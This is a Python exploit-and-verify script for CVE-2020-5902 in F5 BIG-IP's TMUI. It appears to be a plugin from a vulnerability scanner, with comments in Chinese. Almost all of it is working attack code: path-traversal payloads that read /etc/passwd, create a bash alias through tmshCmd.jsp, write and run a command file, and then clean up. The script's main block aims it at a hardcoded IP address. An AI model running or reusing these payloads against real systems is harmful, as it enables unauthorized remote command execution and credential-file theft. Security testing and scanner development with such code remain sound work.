#!/usr/bin/env python3

import re
import json
import uuid
from app.lib.utils.request import request
from datetime import datetime

class CVE_2020_5902_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.file = str(uuid.uuid1())
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        self.check_payload = '/tmui/login.jsp/..;/tmui/system/user/authproperties.jsp'
        self.cmd_payload = '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash'
        self.filesave_payload = '/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/{0}&content={1}'
        self.list_payload = '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/%s' %(self.file)
        self.delete_payload = '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list'
        self.read_payload = '/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'

    def check(self):
        """
        检测是否存在漏洞

        :param:
        :return True or False
        """
        check_req = request.get(self.url + self.check_payload, headers = self.headers)
        if 'password_policy_table' in check_req.text:
            return True
        hsqldbRsp = request.get(self.url + '/hsqldb;', headers = self.headers)
        if 'HSQL Database Engine' in hsqldbRsp.text and hsqldbRsp.status_code == 200:
            return True
        hsqldbRsp1 = request.get(self.url + '/hsqldb%0a', headers = self.headers)
        if 'HSQL Database Engine' in hsqldbRsp1.text and hsqldbRsp1.status_code == 200:
            return True
        return False
    
    def readfile(self):
        """
        读取文件内容

        :param:
        :return True or False
        """
        try:
            if self.check():
                read_req = request.get(self.url + self.read_payload, headers = self.headers)
                result = json.loads(read_req.text)['output']
                # return result
                return True
            else:
                return False
        except Exception as e:
            return False
        finally:
            pass

    def cmd(self):
        """
        执行命令

        :param:
        :return True or False
        """
        try:
            if self.check():
                cmd_url = self.url + "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash"
                cmd_req = request.get(cmd_url)
                cmd_str = json.dumps(cmd_req.headers.__dict__['_store'])
                if cmd_req.status_code == 200 and 'tmui' in cmd_str:
                    filesave_req = request.get(self.url + self.filesave_payload.format(self.file, 'whoami'))
                    filesave_str = json.dumps(filesave_req.headers.__dict__['_store'])
                    if filesave_req.status_code == 200 and 'tmui' in filesave_str:
                        list_req = request.get(self.url + self.list_payload)
                        list_str = json.dumps(list_req.headers.__dict__['_store'])
                        if list_req.status_code == 200 and 'tmui' in list_str:
                            if len(list_req.text) > 33:
                                command_result = json.loads(list_req.text)['output']
                                delete_req = request.get(self.url + self.delete_payload)
                                response_str = json.dumps(delete_req.headers.__dict__['_store'])
                                # return command_result
                                return True
                    return False
                else:
                    return False
            else:
                return False
        except Exception as e:
            return False
        finally:
            pass
    
    def run(self):
        """
        执行入口

        :param:
        :return True or False
        """
        try:
            cmd_resutl = self.cmd()
            readfile_result = self.readfile()
            if not cmd_resutl and readfile_result:
                print('命令执行失败,但读取文件成功')
                return True
            if cmd_resutl and not readfile_result:
                print('命令执行成功,但读取文件失败')
                return True
            if not cmd_resutl and not readfile_result:
                return False
        except Exception as e:
            return False
        finally:
            pass

if  __name__ == "__main__":
    CVE_2020_5902 = CVE_2020_5902_BaseVerify('https://20.190.3.75:443')
    CVE_2020_5902.run()
      